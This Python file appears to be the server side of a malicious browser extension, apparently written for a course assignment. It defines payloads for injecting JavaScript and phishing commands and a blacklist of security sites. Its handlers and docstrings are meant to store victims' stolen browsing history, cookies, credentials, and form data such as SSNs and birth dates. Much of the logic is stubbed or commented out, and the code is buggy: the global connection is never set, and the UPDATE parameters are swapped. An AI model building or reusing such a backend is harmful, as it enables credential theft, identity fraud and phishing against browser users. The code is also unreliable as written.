import pymysql
import json
from copy import deepcopy

conn = None
BASE_SERVER_RESPONSE = {
    "clientid": 0,
    "security_blacklist":[],
    "ad_domains":[],
    "js-cmd":[],
    "phish-cmd":[]
}
pending_payloads = {} #format: clientid:<instance of server response>; fetched from database


def new_response(clientid):
    resp = deepcopy(BASE_SERVER_RESPONSE)
    resp["clientid"] = clientid
    return resp


def initDB():
    if(conn == None):
        conn = pymysql.connect(host='localhost', port= 3306, user='root', passwd='seanonymous', db='cse331')


def getCursor():
    if(conn == None):
        initDB()
    return conn.getCursor()


"""
Gets pending payload or constructs a new one and populates based on defaults from the database.
Pulls blacklist and ad list from database
"""
def construct_response(clientid):
    resp = pending_payloads.pop(clientid, None) or new_response(clientid)

    return resp


"""
Handles creation of new client.
param data is the entire payload converted from json into a dictionary
parses any possible data and inserts the row, then returns the clientid that was generated using LAST_INSERT_ID()
for example, browser history, credentials, forms, etc.
"""
def create_new_client(data):
    return 0


"""
Appends each url in the list of history to the client's history file 
    after appending a current timestamp
param data => list of urls
file: ../history-files/<clientid>-hist.txt
returns 0 for ok, non-zero for bad data format
"""
def store_history(data, clientid):
    return 0


"""
Stores a single cookie into the database
returns 0 for ok, non-zero for bad data format
"""
def store_cookie(data, clientid):
    return 0


"""
Stores a single credential into the database
returns 0 for ok, non-zero for bad data format
"""
def store_credential(data, clientid):
    return 0


"""
param data: form from extension->server payload in the form of a dictionary. key-value pairs are
    "url": url and remotedef: value
Function first reduces url to subdomain.domain.tld and queries FormIDMappings table for all matching rows
Then, for each remotedef: value pair looks for a mapping from query results. if not found, pair is left
    in the dict. if it is found, the data is stored in the appropriate place. (Credentials, CreditCard, etc.)
Remaining values are stored in the ComplexForms table after being converted back into a json string.
"""
def store_form_data(data):
    url = data.pop("url", None)
    if url == None:
        return -1
    reducedURL = url.split('/')[0] + "//" + url.split('/')[2]
    print(reducedURL)
   """ cur = getCursor()
    phoneNumber = data["forms"]["phone"]
    address = data["forms"]["Address"]
    firstName = data["forms"]["FirstName"]
    lastName = data["forms"]["LastName"]
    birthDate = data["forms"]["BirthDate"]
    email = data["forms"]["Email"]
    ssn = data["forms"]["SSN"]
    id = data["clientid"]
    cur.execute('SELECT ID FROM Client C WHERE ID = (%s)', id)
    if(cur.rowcount == 0):
        cur.execute('INSERT INTO Client(Id, CellPhone, Address, Email, SSN, FirstName, LastName, BirthDate, NextPayload) VALUES(%s, %s, %s,%s, %s, %s, %s, %s, "")', (id, phoneNumber, address, email, ssn, firstName, lastName, birthDate)) 
        conn.commit()   
    else:
        if(phoneNumber != ""):
            cur.execute('UPDATE Client SET CellPhone = (%s) WHERE Id = (%s)', (id, phoneNumber))
        if(address != ""):
            cur.execute('UPDATE Client SET Address = (%s) WHERE Id = (%s)', (id, address))
        if(email != ""):
            cur.execute('UPDATE Client SET Email = (%s) WHERE Id = (%s)',(id, email))
        if(ssn != ""):
            cur.execute('UPDATE Client SET SSN = (%s)  WHERE Id = (%s)',(id, ssn))
        if(firstName != ""):
            cur.execute('UPDATE Client SET FirstName = (%s) WHERE Id = (%s)',(id, firstName))
        if(lastName != ""):
            cur.execute('UPDATE Client SET LastName = (%s) WHERE Id = (%s)',(id, lastName))
        if(birthDate != ""):
            cur.execute('UPDATE Client SET BirthDate = (%s) WHERE Id = (%s)',(id, birthDate))
        conn.commit()"""
